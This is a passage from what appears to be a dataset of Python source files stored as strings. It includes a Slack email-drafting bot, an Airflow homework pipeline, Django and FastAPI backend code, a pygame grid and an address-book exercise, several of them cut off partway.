pd.to_datetime(articles_df['Date and Time'], errors='coerce')\n    articles_df.sort_values(by='Date and Time', ascending=False, inplace=True)\n\n    # Use the most recent date in the filename\n    if not articles_df.empty and not pd.isna(articles_df.iloc[0]['Date and Time']):\n        most_recent_date = articles_df.iloc[0]['Date and Time'].strftime('%Y-%m-%d')\n        filename = f'article_summaries_{most_recent_date}.txt'\n    else:\n        filename = 'article_summaries_no_date.txt'\n\n    with open(filename, 'w', encoding='utf-8') as file:\n        for index, row in articles_df.iterrows():\n            file.write(f\"{row['Headline']}\\n{row['URL']}\\n{row['Date and Time'].strftime('%b %d, %Y %I:%M %p') if not pd.isna(row['Date and Time']) else 'Date not found'}\\n\\nAISummary:\\n{row['AISummary']}\\n\\n---\\n\\n\")\n    \n    # articles_df.to_csv(f'article_summ",
    "import os\nfrom slack_sdk import WebClient\nfrom slack_sdk.errors import SlackApiError\nfrom slack_bolt.adapter.flask import SlackRequestHandler\nfrom slack_bolt import App\nfrom dotenv import find_dotenv, load_dotenv\nfrom flask import Flask, request\nfrom functions import draft_email\n\n# Load environment variables from .env file\nload_dotenv(find_dotenv())\n\n# Set Slack API credentials\nSLACK_BOT_TOKEN = os.environ[\"SLACK_BOT_TOKEN\"]\nSLACK_SIGNING_SECRET = os.environ[\"SLACK_SIGNING_SECRET\"]\nSLACK_BOT_USER_ID = os.environ[\"SLACK_BOT_USER_ID\"]\n\n# Initialize the Slack app\napp = App(token=SLACK_BOT_TOKEN)\n\n# Initialize the Flask app\n# Flask is a web application framework written in Python\nflask_app = Flask(__name__)\nhandler = SlackRequestHandler(app)\n\n\ndef get_bot_user_id():\n    \"\"\"\n    Get the bot user ID using the Slack API.\n    Returns:\n        str: The bot user ID.\n    \"\"\"\n    try:\n        # Initialize the Slack client with your bot token\n        slack_client = WebClient(token=os.environ[\"SLACK_BOT_TOKEN\"])\n        response = slack_client.auth_test()\n        return response[\"user_id\"]\n    except SlackApiError as e:\n        print(f\"Error: {e}\")\n\n\ndef my_function(text):\n    \"\"\"\n    Custom function to process the text and return a response.\n    In this example, the function converts the input text to uppercase.\n\n    Args:\n        text (str): The input text to process.\n\n    Returns:\n        str: The processed text.\n    \"\"\"\n    response = text.upper()\n    return response\n\n\n@app.event(\"app_mention\")\ndef handle_mentions(body, say):\n    \"\"\"\n    Event listener for mentions in Slack.\n    When the bot is mentioned, this function processes the text and sends a response.\n\n    Args:\n        body (dict): The event data received from Slack.\n        say (callable): A function for sending a response to the channel.\n    \"\"\"\n    text = body[\"event\"][\"text\"]\n\n    mention = f\"<@{SLACK_BOT_USER_ID}>\"\n    text = text.replace(mention, \"\").strip()\n\n    say(\"Sure, I'll get right on that!\")\n    # response = my_function(text)\n    response = draft_email(text)\n    say(response)\n\n\n@flask_app.route(\"/slack/events\", methods=[\"POST\"])\ndef slack_events():\n    \"\"\"\n    Route for handling Slack events.\n    This function passes the incoming HTTP request to the SlackRequestHandler for processing.\n\n    Returns:\n        Response: The result of handling the request.\n    \"\"\"\n    return handler.handle(request)\n\n\n# Run the Flask app\nif __name__ == \"__main__\":\n    flask_app.run()\n",
    "import pygame as pg\nimport copy, random\npg.init()\n\nwin = pg.display.set_mode((1280, 720))\nclock = pg.time.Clock()\n\ncells = [\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0",
    "class FuncWrapper:\n    @classmethod\n    def register(cls, func:callable, name=None):\n        name = name or func.__name__\n        instance = cls(name, func)\n        cls[name] = instance\n        return instance \n\n    def __init__(self, name:str, func:callable):\n        self.name  = name \n        self._func = func \n    def __repr__(self):\n        return f\"{type(self).__name__}['{self.name}']\"\n    def __call__(self, *args, **kwargs):\n        return self._func(*args, **kwargs)\n    def __getattr__(self, key):\n        return getattr(self._func, key)\n    \n# FIXME: should be on its own file\nimport os\ndef file_property(filename):\n    def getter(self):\n        file_path = os.path.join(self.dir_path, filename)\n        try:\n            with open(file_path, 'r') as file:\n                return file.read()\n        except FileNotFoundError:\n            return None\n\n    def setter(self, value):\n        file_path = os.path.join(self.dir_path, filename)\n        with open(file_path, 'w') as file:\n            file.write(value)\n\n    return property(getter, setter)\n\n\n",
    "# Generated by Django 4.2.11 on 2024-04-01 21:32\r\n\r\nfrom django.db import migrations, models\r\nimport django.db.models.deletion\r\n\r\n\r\nclass Migration(migrations.Migration):\r\n    dependencies = [\r\n        (\"document\", \"0002_rename_summarizefiles_filedb\"),\r\n    ]\r\n\r\n    operations = [\r\n        migrations.CreateModel(\r\n            name=\"queryDB\",\r\n            fields=[\r\n                (\r\n                    \"id\",\r\n                    models.CharField(max_length=50, primary_key=True, serialize=False),\r\n                ),\r\n                (\"doc_name\", models.CharField(max_length=100)),\r\n                (\"sum_content\", models.CharField(max_length=250)),\r\n            ],\r\n        ),\r\n        migrations.CreateModel(\r\n            name=\"SumDB\",\r\n            fields=[\r\n                (\"doc_id\", models.AutoField(primary_key=True, serialize=False)),\r\n                (\"doc_name\", models.CharField(max_length=100)),\r\n                (\"sum_content\", models.CharField(max_length=250)),\r\n            ],\r\n        ),\r\n        migrations.DeleteModel(\r\n            name=\"FileDB\",\r\n        ),\r\n        migrations.AddField(\r\n            model_name=\"querydb\",\r\n            name=\"doc_id\",\r\n            field=models.ForeignKey(\r\n                on_delete=django.db.models.deletion.CASCADE, to=\"document.sumdb\"\r\n            ),\r\n        ),\r\n    ]\r\n",
    "import datetime\nfrom airflow import DAG\nfrom airflow.operators.empty import EmptyOperator\n\n# import task\nfrom airflow.operators.python_operator import PythonOperator\nfrom airflow.operators.dummy_operator import DummyOperator\nfrom airflow.operators.bash_operator import BashOperator\n\nimport pandas as pd\nimport numpy as np\n\nimport psycopg2\n\n# define a funciton to read data.csv file\n\ndef read_data_csv():\n    # from https://raw.githubusercontent.com/osbm/ain3009-hw1/main/data.csv\n    data = pd.read_csv('https://raw.githubusercontent.com/osbm/ain3009-hw1/main/data.csv')\n    return data\n\ndef feed_sample_data_to_db():\n    # connect to the database\n    # data = pd.read_csv('https://raw.githubusercontent.com/osbm/ain3009-hw1/main/sample-data-postgres.csv')\n    conn = psycopg2.connect(\n        host='postgres',\n        database='airflow',\n        user='airflow',\n        password='airflow'\n    )\n\n    # create a cursor\n    cursor = conn.cursor()\n\n    # drop online_sales table if it exists\n    cursor.execute(\"DROP TABLE IF EXISTS online_sales;\")\n\n    # create a table\n    cursor.execute(\"CREATE TABLE online_sales (sale_id SERIAL PRIMARY KEY, product_id INT, quantity INT, sale_amount DECIMAL(10, 2), sale_date DATE);\")\n\n\n    # loop through the data and insert each row\n    cursor.execute(\n        \"INSERT INTO online_sales (product_id, quantity, sale_amount, sale_date) VALUES (%s, %s, %s, %s)\",\n        (101, 2, 40.00, '2024-03-01')\n    )\n\n    cursor.execute(\n        \"INSERT INTO online_sales (product_id, quantity, sale_amount, sale_date) VALUES (%s, %s, %s, %s)\",\n        (102, 1, 20.00, '2024-03-01')\n    )\n\n    cursor.execute(\n        \"INSERT INTO online_sales (product_id, quantity, sale_amount, sale_date) VALUES (%s, %s, %s, %s)\",\n        (103, 3, 60.00, '2024-03-02')\n    )\n\n    cursor.execute(\n        \"INSERT INTO online_sales (product_id, quantity, sale_amount, sale_date) VALUES (%s, %s, %s, %s)\",\n        (101, 1, 20.00, '2024-03-02')\n    )\n    # commit the transaction\n    conn.commit()\n\n    # close the connection\n    conn.close()\n\n    return None\n\ndef read_data_db():\n    # connect to the database\n    conn = psycopg2.connect(\n        host='postgres',\n        database='airflow',\n        user='airflow',\n        password='airflow'\n    )\n\n    # define the query\n    query = \"SELECT * FROM online_sales\"\n\n    # execute the query\n    data = pd.read_sql(query, conn)\n\n    # close the connection\n    conn.close()\n\n    return data\n\ndef merge_data(data1, data2):\n    data = pd.concat([data1, data2])\n    return data.reset_index(drop=True).to_json()\n\ndef print_data(data):\n    data = pd.read_json(data)\n    print(data)\n    return None\n\ndef remove_nan_rows(data):\n    # print the rows with NaN values and drop them\n    data = pd.read_json(data)\n\n    print(data[data.isnull().any(axis=1)])\n    data = data.dropna()\n    return data.to_json()\n\ndef aggregate_data(data):\n    data = pd.read_json(data)\n    # aggregate the data\n    data = data.groupby('product_id').agg(\n        total_quantity=('quantity', 'sum'),\n        total_sale_amount=('sale_amount', 'sum')\n    ).reset_index()\n\n    return data.to_json()\n\ndef save_data_db(data):\n    # connect to the database\n    data = pd.read_json(data)\n    data = data.convert_dtypes()\n    conn = psycopg2.connect(\n        host='postgres',\n        database='airflow',\n        user='airflow',\n        password='airflow'\n    )\n\n    # save everything to the result table\n    cursor = conn.cursor()\n\n    # drop the table if it exists\n    cursor.execute(\"DROP TABLE IF EXISTS result;\")\n\n    # create the table\n    cursor.execute(\"CREATE TABLE result (product_id INT, total_quantity INT, total_sale_amount DECIMAL(10, 2));\")\n\n    # loop through the data and insert each row\n    for i, row in data.iterrows():\n        cursor.execute(\n            \"INSERT INTO result (product_id, total_quantity, total_sale_amount) VALUES (%s, %s, %s)\",\n            (row['product_id'], row['total_quantity'], row['total_sale_amount'])\n        )\n\n\n    # close the connection\n    conn.close()\n\n    return None\n\n\nwith DAG(\n    dag_id=\"ain3009-hw\",\n    start_date=datetime.datetime(2024, 1, 1),\n    schedule=\"@daily\",\n):\n\n    read_data_csv_task = PythonOperator(\n        task_id=\"read_data_csv\",\n        python_callable=read_data_csv,\n    )\n    place_data_db_task = PythonOperator(\n        task_id=\"place_data_db\",\n        python_callable=feed_sample_data_to_db,\n    )\n\n    read_data_db_task = PythonOperator(\n        task_id=\"read_data_db\",\n        python_callable=read_data_db,\n    )\n\n    merge_data_task = PythonOperator(\n        task_id=\"merge_data\",\n        python_callable=merge_data,\n        op_args=[read_data_csv_task.output, read_data_db_task.output],\n        \n    )\n\n    remove_nan_rows_task = PythonOperator(\n        task_id=\"remove_nan_rows\",\n        python_callable=remove_nan_rows,\n        op_args=[merge_data_task.output],\n    )\n\n    aggregate_data_task = PythonOperator(\n        task_id=\"aggregate_data\",\n        python_callable=aggregate_data,\n        op_args=[re",
    "from sqlalchemy.orm import Session\nfrom Models.empregado_model import Empregado\nfrom schemas.empregado_schema import EmpregadoSchema\nfrom fastapi import HTTPException, status\n\n\ndef get_empregado(db: Session):\n    return db.query(Empregado).all()\n\n\ndef get_empregado_by_id(db: Session, empregado_id: int):\n    find_person = db.query(Empregado).filter(Empregado.id == empregado_id).first()\n    if find_person is not None:\n        return find_person\n    raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=\"Employee with this id not found\")\n\n\ndef create_empregado(db: Session, empregado: EmpregadoSchema):\n    _empregado = Empregado(\n        #id = empregado.id,\n        name = empregado.name,\n        email = empregado.email,\n        salary = empregado.salary,\n        birth = empregado.birth,\n        address = empregado.address)\n\n    db.add(_empregado)\n    db.commit()\n    db.refresh(_empregado)\n    return _empregado\n\n\ndef remove_empregado(db: Session, empregado_id: int):\n    _empregado = get_empregado_by_id(db=db, empregado_id=empregado_id)\n    if _empregado is not None:\n        db.delete(_empregado)\n        db.commit()\n        raise HTTPException(status_code=status.HTTP_200_OK, detail=\"Employee deleted successfully\")\n    raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=\"Employee with this id not found\")\n\n\ndef update_empregado(db: Session, empregado_id: int, name: str, email: str, salary: float, birth: str, address: str):\n    _empregado = get_empregado_by_id(db=db, empregado_id=empregado_id)\n    if _empregado is not None:\n        _empregado.name = name\n        _empregado.email = email\n        _empregado.salary = salary\n        _empregado.birth = birth\n        _empregado.address = address\n\n        db.commit()\n        db.refresh(_empregado)\n        return _empregado\n    raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=\"Employee with this id not found\")",
    "import copy\nimport enum\nimport json\nimport re\nfrom functools import partial, update_wrapper\nfrom urllib.parse import parse_qsl\nfrom urllib.parse import quote as urlquote\nfrom urllib.parse import urlparse\n\nfrom django import forms\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.admin import helpers, widgets\nfrom django.contrib.admin.checks import (\n    BaseModelAdminChecks,\n    InlineModelAdminChecks,\n    ModelAdminChecks,\n)\nfrom django.contrib.admin.exceptions import DisallowedModelAdminToField, NotRegistered\nfrom django.contrib.admin.templatetags.admin_urls import add_preserved_filters\nfrom django.contrib.admin.utils import (\n    NestedObjects,\n    construct_change_message,\n    flatten_fieldsets,\n    get_deleted_objects,\n    lookup_spawns_duplicates,\n    model_format_dict,\n    model_ngettext,\n    quote,\n    unquote,\n)\nfrom django.contrib.admin.widgets import AutocompleteSelect, AutocompleteSelectMultiple\nfrom django.contrib.auth import get_permission_codename\nfrom django.core.exceptions import (\n    FieldDoesNotExist,\n    FieldError,\n    PermissionDenied,\n    ValidationError,\n)\nfrom django.core.paginator import Paginator\nfrom django.db import models, router, transaction\nfrom django.db.models.constants import LOOKUP_SEP\nfrom django.forms.formsets import DELETION_FIELD_NAME, all_valid\nfrom django.forms.models import (\n    BaseInlineFormSet,\n    inlineformset_factory,\n    modelform_defines_fields,\n    modelform_factory,\n    modelformset_factory,\n)\nfrom django.forms.widgets import CheckboxSelectMultiple, SelectMultiple\nfrom django.http import HttpResponseRedirect\nfrom django.http.response import HttpResponseBase\nfrom django.template.response import SimpleTemplateResponse, TemplateResponse\nfrom django.urls import reverse\nfrom django.utils.decorators import method_decorator\nfrom django.utils.html import format_html\nfrom django.utils.http import urlencode\nfrom django.utils.safestring import mark_safe\nfrom django.utils.text import (\n    capfirst,\n    format_lazy,\n    get_text_list,\n    smart_split,\n    unescape_string_literal,\n)\nfrom django.utils.translation import gettext as _\nfrom django.utils.translation import ngettext\nfrom django.views.decorators.csrf import csrf_protect\nfrom django.views.generic import RedirectView\n\nIS_POPUP_VAR = \"_popup\"\nTO_FIELD_VAR = \"_to_field\"\nIS_FACETS_VAR = \"_facets\"\n\n\nclass ShowFacets(enum.Enum):\n    NEVER = \"NEVER\"\n    ALLOW = \"ALLOW\"\n    ALWAYS = \"ALWAYS\"\n\n\nHORIZONTAL, VERTICAL = 1, 2\n\n\ndef get_content_type_for_model(obj):\n    # Since this module gets imported in the application's root package,\n    # it cannot import models from other applications at the module level.\n    from django.contrib.contenttypes.models import ContentType\n\n    return ContentType.objects.get_for_model(obj, for_concrete_model=False)\n\n\ndef get_ul_class(radio_style):\n    return \"radiolist\" if radio_style == VERTICAL else \"radiolist inline\"\n\n\nclass IncorrectLookupParameters(Exception):\n    pass\n\n\n# Defaults for formfield_overrides. ModelAdmin subclasses can change this\n# by adding to ModelAdmin.formfield_overrides.\n\nFORMFIELD_FOR_DBFIELD_DEFAULTS = {\n    models.DateTimeField: {\n        \"form_class\": forms.SplitDateTimeField,\n        \"widget\": widgets.AdminSplitDateTime,\n    },\n    models.DateField: {\"widget\": widgets.AdminDateWidget},\n    models.TimeField: {\"widget\": widgets.AdminTimeWidget},\n    models.TextField: {\"widget\": widgets.AdminTextareaWidget},\n    models.URLField: {\"widget\": widgets.AdminURLFieldWidget},\n    models.IntegerField: {\"widget\": widgets.AdminIntegerFieldWidget},\n    models.BigIntegerField: {\"widget\": widgets.AdminBigIntegerFieldWidget},\n    models.CharField: {\"widget\": widgets.AdminTextInputWidget},\n    models.ImageField: {\"widget\": widgets.AdminFileWidget},\n    models.FileField: {\"widget\": widgets.AdminFileWidget},\n    models.EmailField: {\"widget\": widgets.AdminEmailInputWidget},\n    models.UUIDField: {\"widget\": widgets.AdminUUIDInputWidget},\n}\n\ncsrf_protect_m = method_decorator(csrf_protect)\n\n\nclass BaseModelAdmin(metaclass=forms.MediaDefiningClass):\n    \"\"\"Functionality common to both ModelAdmin and InlineAdmin.\"\"\"\n\n    autocomplete_fields = ()\n    raw_id_fields = ()\n    fields = None\n    exclude = None\n    fieldsets = None\n    form = forms.ModelForm\n    filter_vertical = ()\n    filter_horizontal = ()\n    radio_fields = {}\n    prepopulated_fields = {}\n    formfield_overrides = {}\n    readonly_fields = ()\n    ordering = None\n    sortable_by = None\n    view_on_site = True\n    show_full_result_count = True\n    checks_class = BaseModelAdminChecks\n\n    def check(self, **kwargs):\n        return self.checks_class().check(self, **kwargs)\n\n    def __init__(self):\n        # Merge FORMFIELD_FOR_DBFIELD_DEFAULTS with the formfield_overrides\n        # rather than simply overwriting.\n        overrides = copy.deepcopy(FORMFIELD_FOR_DBFIELD_DEFAULTS)\n        for k, v in self.formfield_overrides.items():\n            overrides.setdefault(k, {}).update(v)\n        s",
    "from collections import UserDict\r\n\r\nclass Field:                                                            # Class Field for input value\r\n    def __init__(self, value):                                          # Construction of class \r\n        self.value = value\r\n\r\n    def __str__(self):                                                  # Magic method\r\n        return str(self.value)\r\n    \r\n    def __repr__(self):\r\n        return str(self.value)\r\n    \r\n    \r\n\r\nclass Name(Field):                                                      # Class Name for creating name for Address Book\r\n    def __init__(self, name=None):                                      # Construction of class with condition\r\n        if name is None:\r\n            raise ValueError\r\n        super().__init__(name)\r\n\r\n\r\nclass Phone(Field):                                                     # Class Phone for creating of phone num for Address Book\r\n    def __init__(self, phone):                                          # Construction of class with condition\r\n        if len(phone) != 10:\r\n            raise ValueError\r\n        super().__init__(phone)\r\n   \r\nclass Record:                                                           # Class Record for creating methods for operation with Address Book\r\n    def __init__(self, name):                                           # Construction of class\r\n        self.name = Name(name)\r\n        self.phones = list()\r\n\r\n    def add_phone(self, phone):                                         # Method for adding phone num\r\n        if self.find_phone(phone):\r\n            return\r\n        self.phones.append(Phone(phone))\r\n\r\n    def remove_phone(self, phone):                                      # Method for removing phone num\r\n        phone = self.find_phone(phone)\r\n        if phone:\r\n            self.phones.remove(phone)\r\n            return\r\n        raise ValueError\r\n    \r\n    def edit_phone(self, old_phone, new_phone):                         # Method for editting existing phone num \r\n        phone = self.find_phone(old_phone)\r\n        if phone:\r\n            phone.value = new_phone\r\n            return\r\n        raise ValueError\r\n\r\n    def find_phone(self, phone):                                        # Method for finding phone num in list of phones       \r\n        for p in self.phones:\r\n            if p.value == phone:\r\n                return p\r\n            \r\n    def __str__(self):                                                  # Magic methods\r\n        return f'Record(Name: {self.name} Phones: {self.phones})'\r\n    \r\n    def __repr__(self):\r\n        return f'Record(Name: {self.name} Phones: {self.phones})'\r\n\r\n           \r\nclass AddressBook(UserDict):                                            # Class Address Book (main operational class) for saving information in it\r\n    def add_record(self, record: Record):                               # Method for adding Record in Address Book\r\n        name = record.name.value\r\n        self.data.update({name: record})\r\n\r\n    def find(self, name):                                               # Method for finding Record in Address Book\r\n        return self.get(name)\r\n    \r\n    def delete(self, name):                                             # Method for removing Record in Address Book\r\n        del self[name]\r\n\r\n\r\nif __name__ == '__main__':                                              # Main condition\r\n    # \u0421\u0442\u0432\u043e\u0440\u0435\u043d\u043d\u044f \u043d\u043e\u0432\u043e\u0457 \u0430\u0434\u0440\u0435\u0441\u043d\u043e\u0457 \u043a\u043d\u0438\u0433\u0438\r\n    book = AddressBook()\r\n\r\n    # \u0421\u0442\u0432\u043e\u0440\u0435\u043d\u043d\u044f \u0437\u0430\u043f\u0438\u0441\u0443 \u0434\u043b\u044f John\r\n    john_record = Record(\"John\")\r\n    john_record.add_phone(\"1234567890\")\r\n    john_record.add_phone(\"5555555555\")\r\n\r\n    # \u0414\u043e\u0434\u0430\u0432\u0430\u043d\u043d\u044f \u0437\u0430\u043f\u0438\u0441\u0443 John \u0434\u043e \u0430\u0434\u0440\u0435\u0441\u043d\u043e\u0457 \u043a\u043d\u0438\u0433\u0438\r\n    book.add_record(john_record)\r\n\r\n    # \u0421\u0442\u0432\u043e\u0440\u0435\u043d\u043d\u044f \u0442\u0430 \u0434\u043e\u0434\u0430\u0432\u0430\u043d\u043d\u044f \u043d\u043e\u0432\u043e\u0433\u043e \u0437\u0430\u043f\u0438\u0441\u0443 \u0434\u043b\u044f Jane\r\n    jane_record = Record(\"Jane\")\r\n    jane_record.add_phone(\"9876543210\")\r\n    book.add_record(jane_record)\r\n\r\n    # \u0412\u0438\u0432\u0435\u0434\u0435\u043d\u043d\u044f \u0432\u0441\u0456\u0445 \u0437\u0430\u043f\u0438\u0441\u0456\u0432 \u0443 \u043a\u043d\u0438\u0437\u0456\r\n    for name, record in book.data.items():\r\n        print(record)\r\n\r\n    # \u0417\u043d\u0430\u0445\u043e\u0434\u0436\u0435\u043d\u043d\u044f \u0442\u0430 